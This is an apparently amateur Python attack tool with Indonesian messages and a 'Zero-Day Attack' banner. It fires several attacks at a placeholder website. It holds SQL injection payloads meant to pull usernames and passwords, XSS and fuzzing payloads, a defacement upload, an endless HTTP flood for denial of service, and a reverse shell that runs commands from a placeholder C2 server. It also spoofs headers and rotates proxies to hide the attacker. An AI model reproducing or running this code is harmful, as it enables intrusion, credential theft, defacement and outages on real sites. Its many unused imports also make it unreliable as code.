import random
import string
import logging
import time
import threading
import requests
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
import os
import shutil
import datetime
import base64
import urllib.parse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import json
import hashlib
import re
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
import socket
import subprocess
import pyfiglet
from sklearn.ensemble import RandomForestClassifier

logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
N = '\033[0m'

def load_file(file_name):
    try:
        with open(file_name, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logging.error(f"File {file_name} tidak ditemukan!")
        return []

USER_AGENTS = load_file('user_agents.txt')
PROXIES = load_file('proxies.txt')

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    ua = UserAgent()
    return ua.random if USER_AGENTS is None else random.choice(USER_AGENTS)

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    })
    return session

def fuzz_target(url):
    """
    Fuzzing function that generates various inputs to trigger potential vulnerabilities.
    """
    fuzz_payloads = [
        "DROP TABLE users;", 
        "' OR 1=1 --", 
        "<script>alert('XSS')</script>", 
        "' OR 1=1 #", 
        "admin' OR '1'='1' --"
    ]
    for payload in fuzz_payloads:
        fuzzed_url = f"{url}?input={payload}"
        print(f"Fuzzing URL: {fuzzed_url}")
        response = requests.get(fuzzed_url)
        if response.status_code == 200:
            print(f"{G}Fuzzing berhasil pada: {fuzzed_url}{N}")
        else:
            print(f"{R}Gagal fuzzing pada: {fuzzed_url}, status code: {response.status_code}{N}")

def advanced_sql_injection(url, session):
    """
    Payload advanced SQL injection (mimicking zero-day payloads).
    """
    payload = "' UNION SELECT null, username, password FROM users --"
    response = session.get(url + "?id=" + payload)
    if response.status_code == 200:
        print(f"{G}SQL Injection berhasil pada: {url}{N}")
    else:
        print(f"{R}Gagal SQL Injection pada: {url}, status code: {response.status_code}{N}")

def reverse_shell():
    """
    Reverse shell example connecting to a C2 server (be cautious in use).
    """
    server_ip = 'YOUR_C2_SERVER_IP'
    server_port = 4444
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))
    while True:
        command = sock.recv(1024).decode('utf-8')
        if command == 'exit':
            sock.close()
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        sock.send(output.stdout + output.stderr)

def multi_vector_attack(url, session):
    """
    Trigger multiple attack vectors in parallel.
    """
    threading.Thread(target=advanced_sql_injection, args=(url, session)).start()
    threading.Thread(target=fuzz_target, args=(url,)).start()
    threading.Thread(target=reverse_shell).start()

def deface_website(url, session):
    """
    Perform a website defacement attack by uploading a defacement payload.
    Replace 'payload_file.html' with actual HTML content you want to use for defacing.
    """
    payload = """
    <html>
    <head><title>Hacked</title></head>
    <body><h1>Website Hacked!</h1><p>This website has been compromised.</p></body>
    </html>
    """
    files = {'file': ('deface.html', payload, 'text/html')}
    response = session.post(url, files=files)
    if response.status_code == 200:
        print(f"{G}Website berhasil di-deface pada: {url}{N}")
    else:
        print(f"{R}Gagal deface pada: {url}, status code: {response.status_code}{N}")

def xss_attack(url):
    """
    Perform a simple XSS attack by injecting a script into the URL.
    """
    payload = "<script>alert('XSS Attack!')</script>"
    xss_url = f"{url}?search={payload}"
    response = requests.get(xss_url)
    if payload in response.text:
        print(f"{G}XSS berhasil pada: {xss_url}{N}")
    else:
        print(f"{R}Gagal XSS pada: {xss_url}{N}")

def ddos_attack(url):
    """
    Perform a DDoS Layer 7 (HTTP Flood) attack by sending multiple HTTP requests.
    """
    while True:
        try:
            response = requests.get(url, headers={'User-Agent': get_random_user_agent()})
            print(f"{M}DDoS Attack on: {url}, Status Code: {response.status_code}{N}")
        except requests.exceptions.RequestException as e:
            print(f"{R}Error during DDoS attack: {e}{N}")

def execute_attack(url, attack_type, session):
    if attack_type == 'sql_injection':
        advanced_sql_injection(url, session)
    elif attack_type == 'fuzzing':
        fuzz_target(url)
    elif attack_type == 'reverse_shell':
        reverse_shell()
    elif attack_type == 'multi_vector':
        multi_vector_attack(url, session)
    elif attack_type == 'deface':
        deface_website(url, session)
    elif attack_type == 'xss':
        xss_attack(url)
    elif attack_type == 'ddos':
        ddos_attack(url)
    else:
        print(f"{R}Jenis serangan tidak valid!{N}")

if __name__ == "__main__":
    print(pyfiglet.figlet_format("Zero-Day Attack"))
    
    url_target = "http://abcd.com"
    
    session = create_session()

    execute_attack(url_target, 'sql_injection', session)
    execute_attack(url_target, 'fuzzing', session)
    execute_attack(url_target, 'multi_vector', session)
    execute_attack(url_target, 'reverse_shell', session)
    execute_attack(url_target, 'deface', session)
    execute_attack(url_target, 'xss', session)
    execute_attack(url_target, 'ddos', session)
